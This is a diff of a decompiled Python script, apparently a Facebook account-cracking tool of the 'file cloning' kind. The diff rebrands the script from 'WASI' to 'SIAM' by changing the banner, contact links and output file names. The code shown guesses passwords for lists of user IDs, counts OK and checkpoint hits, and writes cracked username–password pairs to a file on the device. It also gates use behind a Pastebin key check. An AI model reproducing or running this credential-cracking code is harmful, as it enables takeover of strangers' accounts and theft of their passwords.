@@ -1,11 +1,11 @@
 # Decompile by : 'SIAM
 import os,sys
 try: import requests
-except ModuleNotFoundError:print("WASI Install Module requests");os.system("python -m pip install requests &> /dev/WASI")
+except ModuleNotFoundError:print("SIAM Install Module requests");os.system("python -m pip install requests &> /dev/WASI")
 try: import bs4
-except ModuleNotFoundError:print("WASI Install Module bs4");os.system("python -m pip install bs4 &> /dev/WASI")
+except ModuleNotFoundError:print("SIAM Install Module bs4");os.system("python -m pip install bs4 &> /dev/WASI")
 try: import mechanize
-except ModuleNotFoundError:print("WASI Install Module mechanize");os.system("python -m pip install mechanize &> /dev/WASI")
+except ModuleNotFoundError:print("SIAM Install Module mechanize");os.system("python -m pip install mechanize &> /dev/WASI")
 try: import gTTS
 except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/WASI")
 ## import in
@@ -89,7 +89,7 @@ def line_chack_dote():
 	time.sleep(0.1)
     
 def main_apv():
-    ak="WASI"
+    ak="SIAM"
     os.system('clear')
     logo()
     try:
@@ -113,7 +113,7 @@ def main_apv():
         print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
         print ("[*]--------------------------------------------------------------")
         time.sleep(6)
-        os.system("xdg-open https://wa.me/+923118933642")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100052683424097 ")
         
     r1=requests.get("https://pastebin.com/raw/GUgkVAWC").text
     if key1 in r1:
@@ -132,14 +132,14 @@ def main_apv():
         print ("     Copy Key And Sent Me WP Approvel Your Key ")
         print ("[*]--------------------------------------------------------------")
         time.sleep(3.5)
-        os.system("xdg-open https://wa.me/+93118933642")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100052683424097 ")
 		
 def R():
 			os.system("clear")
 			logo() 
 			
 			print(" \033[1;93m[1] START  FILE CLONING  ")
-			print(" \033[1;93m[2] WHATSAPP ")
+			print(" \033[1;93m[2] FACEBOOK ")
 			print (" \033[1;93m[0] EXIT") 
 			print (' \033[1;37m')
 			key = input(" [*] \033[1;94mC H O O S E : ")
@@ -234,7 +234,7 @@ class __crack__:
 		self.__pler__()
 	def __mbasic__(self, user, _sempak_):
 		global ok,cp,loop
-		sys.stdout.write('\r\033[1;32m[ WASI 😘] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
+		sys.stdout.write('\r\033[1;32m[ SIAM😘] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
 		sys.stdout.flush()
 		for pw in _sempak_:
 			pw = pw.lower()
@@ -270,7 +270,7 @@ class __crack__:
 					
 					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahn(user))
 					cp.append(wrt)
-					open('/sdcard/WASI_CP.txt','a').write('%s\n' % wrt)
+					open('/sdcard/SIAM_CP.txt','a').write('%s\n' % wrt)
 					break
 				except (KeyError, IOError):
 					month = ''
@@ -281,7 +281,7 @@ class __crack__:
 				print('\r\033[1;91m[WASI-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahu(user))
 				cp.append(wrt)
-				open('/sdcard/WASI_CP.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SIAM_CP.txt','a').write('%s\n' % wrt)
 				break
 			else:
 				continue
@@ -416,10 +416,10 @@ banner ="""\033[1;97m
 ╚═════╝░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
  
 \x1b[1;97m------------------------\x1b[1;97m------------------------×
-\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97m          Wasi-Qureshi
-\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97m          Wasi-Qureshi
-\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97m           Wasi-Qureshi
-\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m             4.0.0
+\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97m          SIAM-VAU
+\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97m          SHIAM KHAN
+\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97m           SIAM 000
+\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m             4.0.5
 \x1b[1;97m------------------------\x1b[1;97m------------------------×
                                                  """
 ct = datetime.now()
